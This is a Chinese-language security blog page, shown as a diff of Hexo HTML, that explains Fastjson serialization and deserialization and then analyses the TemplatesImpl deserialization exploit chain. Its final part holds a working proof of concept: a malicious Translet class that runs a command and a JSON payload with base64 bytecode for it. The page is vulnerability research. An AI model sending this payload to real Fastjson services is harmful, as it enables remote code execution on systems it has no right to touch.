@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化相关安全研究与分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化">
+<meta property="og:url" content="http://example.com/2025/01/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化相关安全研究与分析">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732696623586-35f05d8e-6341-4fa7-82c2-0ecaf60317e8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1735638660961-a4b3956d-fa49-4985-bdbf-6c7b72d0f930.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1735638985993-3724ab80-0b6b-44c4-92c3-c452eebef26a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732707881065-262905f6-a821-4fb7-850b-774f5c71f2df.png">
+<meta property="article:published_time" content="2025-01-07T06:36:26.000Z">
+<meta property="article:modified_time" content="2025-01-07T06:36:26.767Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732696623586-35f05d8e-6341-4fa7-82c2-0ecaf60317e8.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Fastjson反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h2><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse来分别实现序列化和反序列化操作。</p>
+<h1 id="使用Fastjson进行序列化和反序列化"><a href="#使用Fastjson进行序列化和反序列化" class="headerlink" title="使用Fastjson进行序列化和反序列化"></a>使用Fastjson进行序列化和反序列化</h1><p>maven依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Student.java，定义的一个学生类，其中包含两个属性及其getter&#x2F;setter方法，还有类的构造函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>FJTest.java，调用JSON.toJsonString()来序列化Student类对象 ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setName(<span class="string">&quot;Mi1k7ea&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">6</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SerializerFeature-WriteClassName"><a href="#SerializerFeature-WriteClassName" class="headerlink" title="SerializerFeature.WriteClassName"></a>SerializerFeature.WriteClassName</h2><p>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter&#x2F;setter&#x2F;is方法。</p>
+<p>Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p>
+<p>输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 设置了SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 未设置SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>FJTest2.java，调用JSON.parseObject()反序列化JSON为对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Mi1k7ea\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">Student@75b9fd80</span><br><span class="line">Student</span><br><span class="line">反序列化类</span><br></pre></td></tr></table></figure>
+
+<h2 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h2><p>如果需要还原出private属性的话，还需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参数。</p>
+<p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    public void setAge(int age) &#123;</span></span><br><span class="line">    <span class="comment">//        System.out.println(&quot;setAge&quot;);</span></span><br><span class="line">    <span class="comment">//        this.age = age;</span></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(32, 32, 32);"></font></p>
+<p><font style="color:rgb(32, 32, 32);">修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Mi1k7ea\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        System.out.println(obj.getName() + <span class="string">&quot; &quot;</span> + obj.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(32, 32, 32);">重新运行，会看到获取不到私有变量age的值而是被设置为0：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@7addc524</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 0</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(32, 32, 32);">接着添加Feature.SupportNonPublicField：</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(32, 32, 32);">再输出就能成功还原出age这个私有变量的值了：</font></p>
+<p><font style="color:rgb(32, 32, 32);"></font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@2c59109c</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 6</span><br></pre></td></tr></table></figure>
+
+
+
+<p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p>
+<h2 id="setter、getter、is自动调用"><a href="#setter、getter、is自动调用" class="headerlink" title="setter、getter、is自动调用"></a>setter、getter、is自动调用</h2><p>在通过@type拿到类之后，通过反射拿到该类所有的方法存入methods，接下来遍历methods进而获取get、set方法。总结set方法自动调用的条件为：</p>
+<ul>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>返回值为void或当前类</li>
+<li>方法名以set开头</li>
+<li>参数个数为1</li>
+</ul>
+<p>当满足条件之后会从方法名截取属性名，截取时会判断_，如果是set_name会截取为name属性，当截取完但是找不到这个属性，会判断传入的第一个参数类型是否为布尔型，是的话就在截取完的变量前加上is，截取propertyName的第一个字符转大写和第二个字符，并且然后重新尝试获取属性字段。</p>
+<p>set的整个判断就是：如果有setCmd()会绑定cmd属性，如果该类没有cmd属性会绑定isCmd属性。</p>
+<p>get的判断</p>
+<p>总结下就是：</p>
+<ul>
+<li>方法名长度大于等于4</li>
+<li>非静态方法</li>
+<li>以get开头且第4个字母为大写</li>
+<li>无传入参数</li>
+<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
+</ul>
+<h2 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h2><p>parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。</p>
+<p> parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>parse(jsonStr) ：构造方法+Json字符串指定属性的setter()+特殊的getter()</li>
+<li>parseObject(jsonStr) ：构造方法+所有 setter 和 getter 方法。</li>
+</ul>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h2><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>条件苛刻</p>
+<p>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)</p>
+<p>服务端使用parse()时，需要JSON.parse(text1,Feature.SupportNonPublicField)。</p>
+<p>原因：TemplatesImpl利用链的多个属性都是private</p>
+<h3 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="为什么恶意类需要继承AbstractTranslet类"><a href="#为什么恶意类需要继承AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承AbstractTranslet类"></a>为什么恶意类需要继承AbstractTranslet类</h4><p><font style="color:rgb(32, 32, 32);">getOutputProperties–&gt;newTransformer–&gt;getTransletInstance()–&gt;</font>defineTransletClasses()有个逻辑会判断恶意类的父类类名是否是ABSTRACT_TRANSLET，是的话_transletIndex变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。</p>
+<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>PoC中几个重要的Json键的含义：</p>
+<p>@type——指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField；</p>
+<p>_bytecodes——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</p>
+<p>_outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</p>
+<p>_tfactory:{}——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</p>
+<p>漏洞代码</p>
